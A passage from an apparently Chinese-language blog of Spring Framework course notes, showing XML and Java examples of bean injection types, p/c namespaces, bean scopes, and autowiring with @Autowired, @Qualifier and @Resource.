class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;address&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.Address&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;address&quot;</span> <span class="attr">value</span>=<span class="string">&quot;西安&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;student&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.Student&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--第一种，普通值注入 value--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;狂神&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--第二种： Bean注入 ref--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;address&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;address&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--第三种： 数组注入 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;books&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>红楼梦<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>西游记<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>水浒传<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>三国演义<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--第四种：list注入--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>听歌<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>敲代码<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>看电影<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--第五种：map注入--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;身份证&quot;</span> <span class="attr">value</span>=<span class="string">&quot;111111111111111111&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;银行卡&quot;</span> <span class="attr">value</span>=<span class="string">&quot;22222222222222222222&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--第六种：set注入--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;games&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>LOL<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>COC<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>BOB<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--第七种：null注入--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;wife&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--第七种：Properties注入--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;driver&quot;</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;url&quot;</span>&gt;</span>localhost://3306<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;username&quot;</span>&gt;</span>root<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;password&quot;</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>测试类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> (Student)context.getBean(<span class="string">&quot;student&quot;</span>);</span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><h3 id="6-3、拓展方式注入"><a href="#6-3、拓展方式注入" class="headerlink" title="6.3、拓展方式注入"></a>6.3、拓展方式注入</h3><p>我们可以使用p命令空间和c命令空间进行注入</p><p>官方解释：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/spring%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/4.png"                      alt="1078856-20170205160357354-490660449"                ></p><p>使用！</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:c</span>=<span class="string">&quot;http://www.springframework.org/schema/c&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--p命名空间可以直接注入属性的值 property--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.User&quot;</span> <span class="attr">p:name</span>=<span class="string">&quot;狂神&quot;</span> <span class="attr">p:age</span>=<span class="string">&quot;18&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--c命名空间可以通过构造器注入 construct-args--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.User&quot;</span> <span class="attr">c:age</span>=<span class="string">&quot;18&quot;</span> <span class="attr">c:name</span>=<span class="string">&quot;狂神2&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>测试：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;userBeans.xml&quot;</span>);</span><br><span class="line">    <span class="comment">//User user = (User)context.getBean(&quot;user&quot;);</span></span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> context.getBean(<span class="string">&quot;user&quot;</span>, User.class);</span><br><span class="line">    System.out.println(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>注意点：p命名和c命名空间不能直接使用，需要引入xml约束!</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line">xmlns:p=&quot;http://www.springframework.org/schema/p&quot;</span><br><span class="line">xmlns:c=&quot;http://www.springframework.org/schema/c&quot;</span><br></pre></td></tr></table></figure></div><h3 id="6-4、Bean的作用域"><a href="#6-4、Bean的作用域" class="headerlink" title="6.4、Bean的作用域"></a>6.4、Bean的作用域</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/spring%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/5.png"                      alt="1078856-20170205160357354-490660449"                ></p><ol><li><p>单例模式(Spring默认机制)</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.User&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;singleton&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>原型模式：每次从容器中get的时候，都会产生一个现对象！</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.User&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>其余的request、session、application这些个只能在web开发中使用到</p></li></ol><h2 id="7、Bean的自动装配"><a href="#7、Bean的自动装配" class="headerlink" title="7、Bean的自动装配"></a>7、Bean的自动装配</h2><ul><li>自动装配是Spring满足bean依赖的一种方式</li><li>Spring会在上下文自动寻找，并自动给bean装配属性！</li></ul><p>在Spring中有三种自动装配的方式</p><ol><li>在xml中显示的配置</li><li>在java中显示配置</li><li>隐式的自动装配bean【重要】</li></ol><p>这里我们主要讲第三种：自动化的装配bean。</p><h3 id="7-1、测试"><a href="#7-1、测试" class="headerlink" title="7.1、测试"></a>7.1、测试</h3><p>环境搭建：一个人有两个宠物</p><h3 id="7-2、ByName自动装配"><a href="#7-2、ByName自动装配" class="headerlink" title="7.2、ByName自动装配"></a>7.2、ByName自动装配</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    byName:会自动在容器上下文中套接，和自己对象的set方法后面的值相对应的beanid</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;people&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.People&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byName&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;狂神&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="7-3、ByType自动装配"><a href="#7-3、ByType自动装配" class="headerlink" title="7.3、ByType自动装配"></a>7.3、ByType自动装配</h3><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    byType:会自动在容器上下文中套接，和自己对象属性类型相同的beanid</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;people&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.People&quot;</span> <span class="attr">autowire</span>=<span class="string">&quot;byType&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;狂神&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>小结：</p><ul><li>byname的时候，需要保证所有bean的id唯一，并且这个bean需要和自动注入的属性的set方法的值一致</li><li>bytype的时候，需要保证所有bean的class唯一，并且这个bean需要和自动注入的属性的类型一致</li></ul><h3 id="7-4、使用注解实现自动装配"><a href="#7-4、使用注解实现自动装配" class="headerlink" title="7.4、使用注解实现自动装配"></a>7.4、使用注解实现自动装配</h3><p>jdk1.5支持的注解，Spring2.5就支持注解了！</p><p>The introduction of annotation-based configuration raised the question of whether this approach is “better” than XML. </p><p>要使用注解需知：</p><ol><li><p>导入约束：context支持</p></li><li><p>配置注解的支持：<a class="link"   href="context:annotation-config/" >context:annotation-config/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="Autowired注解"><a href="#Autowired注解" class="headerlink" title="@Autowired注解"></a>@Autowired注解</h4><ul><li><p>需要导入 spring-aop的包！</p></li><li><p>直接在属性上使用即可！也可以在set方式上使用！</p></li><li><p>使用Autowired我们可以不用编写set方法，前提是你这个自动装配的属性在IOC（Spring）容器中存在，且符合名字byName和类型byType！</p><ul><li><p>正常1（byName）</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;people&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.People&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>正常2（byType）</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat111&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog222&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;people&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.People&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>正常3（混合使用，先类型后名字）</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat11&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog222&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;people&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.People&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>不正常（多种类型且名字也不匹配，报错）</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat11&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;cat111&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.Cat&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog22&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dog222&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.Dog&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;people&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.pojo.People&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></div></li></ul></li><li><p>科普：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Nullable 字段标记了这个注解，说明这个字段可以为null</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Autowired &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">required</span><span class="params">()</span> <span class="keyword">default</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>测试代码</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">People</span> &#123;</span><br><span class="line">    <span class="comment">//如果显示的定义了Autowired的required属性为false，说明这个对象可以为null，否则不允许为空</span></span><br><span class="line">    <span class="meta">@Autowired(required = false)</span></span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>如果@Autowired自动装配的环境比较复杂，自动装配无法通过一个注解【@Autowired】完成的时候，我们可以使用@Qualifilter(value&#x3D;”xxx”)去配合@Autowired的使用，指定一个唯一的bean对象注入</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">People</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="meta">@Qualifier(value = &quot;cat11&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="meta">@Qualifier(value=&quot;dog222&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ul><h4 id="Resource注解"><a href="#Resource注解" class="headerlink" title="Resource注解"></a>Resource注解</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">People</span> &#123;</span><br><span class="line">    <span class="meta">@Resource(name = &quot;cat1&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Cat cat;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> Dog dog;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>小结：</p><p>@Resource和@Autowired</p><ul><li>都是用来自动装配的，都可以放在属性字段上</li><li>实现方式不同<ul><li>@Autowired默认通过bytype的方式实现，如果有多个类型，则通过byname实现，如果两个都找不到，就报错！</li><li>@Resource默认通过byname的方式实现，如果找不到名字，则通过bytype实现，如果两个都找不到，就报错！</li></ul></li><li>执行的顺序不同：<ul><li>@Autowired默认通过bytype的方式实现</li><li>@Resource默认通过byname的方式实现</li></ul></li><li>类型重复的话，如果名字不是默认的（如cat11，cat111，而没有默认的cat）<ul><li>@Autowired配合@Qualifier(value &#x3D; “cat11”)使用</li><li>@Resource直接使用@Resource(name &#x3D; “cat11”)</li></ul></li></ul></li></ol><h2 id="8-使用注解开发"><a href="#8-使用注解开发" class="headerlink" title="8.使用注解开发"></a>8.使用注解开发</h2><p>在Spring4之后，要使用注解开发，必须要保证aop的包导入了</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/spring%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/6.png"                      alt="1078856-20170205160357354-490660449"                ></p><p>使用注解需要导入context约束，增加注解的支持！</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></div><ol><li><p>bean</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 等价于 &lt;bean id=&quot;user&quot; class=&quot;nuc.ss.pojo.User&quot;/&gt;</span></span><br><span class="line"><span class="meta">@Component</span></span><br></pre></td></tr></table></figure></div></li><li><p>属性如何注入@Value(“xxx”)</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="comment">//相当于&lt;property name=&quot;name&quot; value=&quot;狂神&quot;/&gt;</span></span><br><span class="line">    <span class="meta">@Value(&quot;狂神&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span 